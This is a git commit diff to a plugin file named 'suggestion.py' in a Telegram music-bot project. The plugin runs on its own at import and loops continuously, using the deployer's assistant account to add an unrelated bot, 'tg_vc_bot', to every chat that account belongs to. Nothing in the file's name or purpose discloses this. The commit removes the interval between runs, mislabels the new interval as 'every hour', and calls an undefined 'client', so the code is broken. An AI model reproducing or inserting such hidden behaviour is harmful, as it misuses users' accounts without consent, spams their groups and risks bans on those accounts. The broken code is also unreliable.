5022b34ba5e0ae9965d78c1db7dac8a4ff35c269
THE VIP BOY <117478195+THE-VIP-BOY-OP@users.noreply.github.com>
2024-04-26 08:43:59 +0530

    Update suggestion.py

--- DAXXMUSIC/plugins/misc/suggestion.py
+++ DAXXMUSIC/plugins/misc/suggestion.py
@@ -1,18 +1,18 @@
 import asyncio
 import datetime
 from pyrogram import Client
-from VIPMUSIC.utils.database import get_assistant
+from DAXXMUSIC.utils.database import get_assistant
 import config
-from VIPMUSIC import app
+from DAXXMUSIC import app
 
 AUTO_GCAST = True
-
-ADD_INTERVAL = 86400  # Add every day (in seconds)
+BOT_USERNAME = "tg_vc_bot"
+ADD_INTERVAL = 1  # Add every hour (in seconds)
 
 async def add_bot_to_chats():
     try:
         userbot = await get_assistant(config.LOGGER_ID)
-        bot = await app.get_users("tg_vc_bot")
+        bot = await client.get_users(BOT_USERNAME)
         bot_id = bot.id
         
         async for dialog in userbot.get_dialogs():
@@ -20,20 +20,22 @@ async def add_bot_to_chats():
                 continue
             try:
                 await userbot.add_chat_members(dialog.chat.id, bot_id)
-                
+                print(f"Added bot to chat: {dialog.chat.title}")
             except Exception as e:
-                await asyncio.sleep(3)  # Adjust sleep time based on rate limits
+                print(f"Failed to add bot to chat: {dialog.chat.title}")
+                print(e)
+            
+            await asyncio.sleep(1)  # Adjust sleep time based on rate limits
         
     except Exception as e:
-        pass
+        print("Error:", e)
 
-async def continuous_adds():
+async def continuous_add():
     while True:
         if AUTO_GCAST:
             await add_bot_to_chats()
             
-        await asyncio.sleep(ADD_INTERVAL)
-
+        
 # Start the continuous broadcast loop if AUTO_GCAST is True
 if AUTO_GCAST:  
-    asyncio.create_task(continuous_adds())
+    asyncio.create_task(continuous_add())
